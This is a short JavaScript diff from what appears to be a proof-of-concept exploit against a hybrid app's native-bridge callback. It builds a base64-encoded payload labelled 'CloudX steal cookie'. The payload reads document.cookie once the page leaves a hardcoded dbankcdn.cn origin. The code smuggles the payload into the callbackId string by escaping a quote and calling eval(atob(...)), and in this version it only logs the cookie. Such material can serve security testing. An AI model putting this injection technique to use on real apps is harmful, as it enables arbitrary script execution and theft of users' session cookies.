@@ -313,19 +313,13 @@
         const currUrl = location.href;
         //要注入的代码
         const payload = `
-        if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {
-            window.__cloudx_called = true;
-            console.log('CloudX steal cookie url: '+ location.href + ',cookie : ' + document.cookie)
-        }
+if (!location.href.startsWith("https://h5hosting-drcn.dbankcdn.cn") && !window.__cloudx) {window.__cloudx = true;console.log('CloudX steal cookie : ' + document.cookie)} 
         `;
         const base64Code = btoa(payload);
 
         // const callbackId = service + genCallbackId() + '\'); console.log(11111) //';
         const callbackId = service + genCallbackId() + '\');' + `eval(atob("${base64Code}"));` + '//';
-
-
         if (success || fail) callbackCache[callbackId] = {success, fail};
-
         // 调用Native方法
         const nativeBridge = getNativeBridge(bridgeName);
 
